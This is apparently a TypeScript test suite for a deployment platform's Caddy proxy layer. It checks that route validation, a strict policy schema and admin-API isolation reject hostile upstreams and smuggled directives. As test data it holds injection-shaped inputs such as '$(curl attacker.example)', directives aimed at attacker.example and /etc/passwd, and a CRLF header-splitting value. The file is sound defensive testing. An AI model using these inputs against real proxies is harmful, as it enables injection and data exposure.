import { DEFAULT_ROUTE_POLICY, routePolicySchema } from "@otterdeploy/shared/route-policy";
/**
 * od-5j8.6 — Caddy admin isolation + typed route policy.
 *
 * Invariant under test:
 *   1. `routeValidationError` (the final boundary before a value becomes a
 *      Caddyfile token) rejects loopback, private, and "foreign alias"
 *      upstreams — a tenant proxy route can only ever target an identity the
 *      control plane itself minted (`otterdeploy-<slug>` service names, the
 *      `*.otterdeploy.internal` database naming convention, or the literal
 *      control-plane server/host.docker.internal pair).
 *   2. `routePolicySchema` is a closed (`.strict()`) allowlist — the former
 *      `custom_directives` raw-Caddyfile escape hatch cannot be
 *      reintroduced by smuggling an extra field through the typed policy.
 *   3. The `proxy_route` table itself no longer has a raw-directive column.
 *   4. The Caddy admin API is reached only over the app's own configured
 *      admin URL/binary — reconcile/builder code never constructs a second,
 *      unvalidated admin endpoint.
 */
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, test } from "vite-plus/test";

import type { ProxyRouteInput } from "../../caddy/builder";

import { routeValidationError } from "../../caddy/route-validation";

const repositoryRoot = resolve(fileURLToPath(new URL(".", import.meta.url)), "../../../../..");

function source(relativePath: string): string {
  return readFileSync(resolve(repositoryRoot, relativePath), "utf8");
}

const baseHttpRoute: ProxyRouteInput = {
  projectId: "project_1",
  type: "http",
  domain: "app.example.com",
  upstreamHost: "otterdeploy-app-abc123",
  upstreamPort: 3000,
  protocol: "http",
  layer4Alpn: null,
  usesAcme: true,
};

const baseLayer4Route: ProxyRouteInput = {
  projectId: "project_1",
  type: "layer4",
  domain: "db.example.com",
  upstreamHost: "postgres.project-1.otterdeploy.internal",
  upstreamPort: 5432,
  protocol: "tcp",
  layer4Alpn: "postgresql",
  usesAcme: true,
};

describe("[od-5j8.6] tenant upstream identities: hostile-path corpus", () => {
  test.each([
    ["loopback", "127.0.0.1"],
    ["loopback alt", "127.1.1.1"],
    ["private RFC1918 10/8", "10.0.0.5"],
    ["private RFC1918 172.16/12", "172.16.0.9"],
    ["private RFC1918 192.168/16", "192.168.1.50"],
    ["localhost hostname", "localhost"],
    ["docker host escape", "host.docker.internal"],
    ["another project's plausible service name", "otterdeploy-victim-svc"], // wrong project, but the
    // validator can only judge shape, not ownership — the id/name minting
    // boundary is what prevents cross-tenant collision upstream of this
    // function. This case documents that the SHAPE check alone passes it,
    // which is why route ownership must be enforced before this call, not by
    // this call.
    ["a raw Docker network alias with no otterdeploy- prefix", "victim-container"],
    [
      "control-plane database internal name used as an HTTP upstream",
      "postgres.project-1.otterdeploy.internal",
    ],
    ["empty string", ""],
    ["a full URL smuggled as a hostname", "http://127.0.0.1:2019"],
    ["command-injection-shaped host", "$(curl attacker.example)"],
  ])(
    "HTTP route: %s (%s) is rejected unless it matches the managed-service shape",
    (_label, upstreamHost) => {
      const error = routeValidationError({ ...baseHttpRoute, upstreamHost });
      if (upstreamHost === "otterdeploy-victim-svc") {
        // Documented boundary case (see comment above): shape-valid but not
        // this project's identity. Assert it's NOT rejected by this function
        // alone, proving ownership must be enforced by the caller before
        // reaching here (regression tripwire: if this starts failing, either
        // the shape rule tightened in a way worth re-documenting, or ownership
        // checking silently moved into this function and the comment is stale).
        expect(error).toBeNull();
        return;
      }
      expect(error).not.toBeNull();
    },
  );

  test.each([
    ["loopback", "127.0.0.1"],
    ["private address", "10.0.0.5"],
    ["an HTTP service name used as a database upstream", "otterdeploy-app-abc123"],
    [
      "wrong TLD suffix (typosquat of the internal zone)",
      "postgres.project-1.otterdeploy.internal.evil.com",
    ],
    ["missing the internal suffix entirely", "postgres.project-1"],
  ])(
    "layer4 route: %s (%s) is rejected unless it matches the managed-database shape",
    (_label, upstreamHost) => {
      expect(routeValidationError({ ...baseLayer4Route, upstreamHost })).not.toBeNull();
    },
  );

  test("the control-plane project may only target the literal server/host.docker.internal upstreams", () => {
    expect(
      routeValidationError({
        ...baseHttpRoute,
        projectId: "control-plane",
        upstreamHost: "server",
      }),
    ).toBeNull();
    expect(
      routeValidationError({
        ...baseHttpRoute,
        projectId: "control-plane",
        upstreamHost: "otterdeploy-app-abc123",
      }),
    ).not.toBeNull();
    expect(
      routeValidationError({
        ...baseHttpRoute,
        projectId: "control-plane",
        upstreamHost: "attacker-controlled",
      }),
    ).not.toBeNull();
  });

  test.each([
    ["non-canonical uppercase domain", "APP.EXAMPLE.COM"],
    ["trailing dot", "app.example.com."],
    ["wildcard domain", "*.example.com"],
    ["embedded whitespace", "app .example.com"],
    ["not a domain at all", "not a domain"],
    ["single label", "localhost"],
  ])("domain %s (%s) is rejected as a non-canonical DNS name", (_label, domain) => {
    expect(routeValidationError({ ...baseHttpRoute, domain })).not.toBeNull();
  });

  test.each([0, -1, 65_536, 1.5, Number.NaN])(
    "port %s is outside the valid TCP range",
    (upstreamPort) => {
      expect(routeValidationError({ ...baseHttpRoute, upstreamPort })).not.toBeNull();
    },
  );

  test("protocol/ALPN fields cannot be mismatched across route types (protocol smuggling)", () => {
    expect(routeValidationError({ ...baseHttpRoute, protocol: "tcp" })).not.toBeNull();
    expect(routeValidationError({ ...baseHttpRoute, layer4Alpn: "postgresql" })).not.toBeNull();
    expect(routeValidationError({ ...baseLayer4Route, protocol: "http" })).not.toBeNull();
    expect(routeValidationError({ ...baseLayer4Route, layer4Alpn: "smtp" })).not.toBeNull();
  });

  test("a well-formed route with no policy override is accepted (control case)", () => {
    expect(routeValidationError(baseHttpRoute)).toBeNull();
    expect(routeValidationError(baseLayer4Route)).toBeNull();
  });
});

describe("[od-5j8.6] the typed route policy is a closed allowlist — raw directives cannot be smuggled back in", () => {
  test("the schema rejects any field outside the declared allowlist", () => {
    const hostileExtras = [
      { customDirective: "reverse_proxy 127.0.0.1:9999" },
      { upstream: "attacker.example:9999" },
      { handler: "file_server" },
      { root: "/etc" },
      { rewrite: "* /etc/passwd" },
      { header_up: "Host attacker.example" },
    ];
    for (const extra of hostileExtras) {
      const result = routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, ...extra });
      expect(result.success).toBe(false);
    }
  });

  test("routeValidationError rejects a route whose policy carries a smuggled field", () => {
    const error = routeValidationError({
      ...baseHttpRoute,
      // @ts-expect-error — deliberately hostile shape under test.
      routePolicy: { ...DEFAULT_ROUTE_POLICY, customDirective: "reverse_proxy internal:9999" },
    });
    expect(error).toBe("route policy is invalid");
  });

  test("a header value with control characters (header/response-splitting) is rejected", () => {
    const result = routePolicySchema.safeParse({
      ...DEFAULT_ROUTE_POLICY,
      contentSecurityPolicy: "default-src 'self'\r\nX-Injected: 1",
    });
    expect(result.success).toBe(false);
  });

  test("maxRequestBodyMb is bounded — cannot be set to an unbounded or negative value", () => {
    expect(
      routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, maxRequestBodyMb: -1 }).success,
    ).toBe(false);
    expect(
      routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, maxRequestBodyMb: 0 }).success,
    ).toBe(false);
    expect(
      routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, maxRequestBodyMb: 101 }).success,
    ).toBe(false);
    expect(
      routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, maxRequestBodyMb: 100 }).success,
    ).toBe(true);
  });

  test("compression/hsts/frameOptions/referrerPolicy are closed enums — no arbitrary directive string", () => {
    expect(
      routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, compression: "brotli-with-backdoor" })
        .success,
    ).toBe(false);
    expect(routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, hsts: "custom" }).success).toBe(
      false,
    );
    expect(
      routePolicySchema.safeParse({ ...DEFAULT_ROUTE_POLICY, frameOptions: "allow-all" }).success,
    ).toBe(false);
  });
});

describe("[od-5j8.6] the raw directive escape hatch is structurally gone", () => {
  test("proxy_route no longer has a custom-directives column", () => {
    const schema = source("packages/db/src/schema/proxy-route.ts");
    // Match an actual field/column declaration, not the explanatory comment
    // that documents its removal ("Unlike the former custom_directives...").
    expect(schema).not.toMatch(/customDirectives\s*:|["'`]custom_directives["'`]\)/);
  });

  test("project no longer has a custom Caddy config column", () => {
    const schema = source("packages/db/src/schema/project.ts");
    expect(schema).not.toMatch(/customCaddyConfig|custom_caddy_config/);
  });

  test("the proxy contract no longer accepts a raw directives field from a client", () => {
    const contract = source("packages/api/src/routers/project/contract/proxy.ts");
    expect(contract).not.toMatch(/customDirectives|rawDirectives/i);
  });

  test("every Caddyfile block builder runs assertSafeRoute before emitting output", () => {
    const builder = source("packages/api/src/caddy/builder.ts");
    // Every exported block-building function that consumes a route must call
    // assertSafeRoute before it can reach string interpolation into the
    // Caddyfile — this is the structural half of the runtime corpus above.
    const callSites = builder.match(/assertSafeRoute\(/g)?.length ?? 0;
    expect(callSites).toBeGreaterThanOrEqual(1);
  });

  test("the reconciler validates every route it renders, not just newly-created ones", () => {
    const reconciler = source("packages/api/src/caddy/reconciler.ts");
    expect(reconciler).toContain("routeValidationError");
  });
});

describe("[od-5j8.6] Caddy admin API isolation", () => {
  test("the admin URL is configured once, centrally, and defaults to a Unix socket", () => {
    const env = source("packages/env/src/server.ts");
    expect(env).toContain("CADDY_ADMIN_URL");
    expect(env).toMatch(/unix:\/\//);
  });

  test("the admin client only speaks unix/http/https to the one configured admin URL — no ad hoc second endpoint", () => {
    const client = source("packages/api/src/caddy/client.ts");
    expect(client).toContain("Caddy admin URL must use unix, http, or https.");
  });

  test("the Caddyfile itself binds the admin API to a permissioned (0600) Unix socket by default", () => {
    const caddyfile = source("infra/caddy/config/Caddyfile");
    expect(caddyfile).toMatch(/admin\s+\{\$CADDY_ADMIN_BIND:unix\/\/.*\|0600\}/);
  });
});
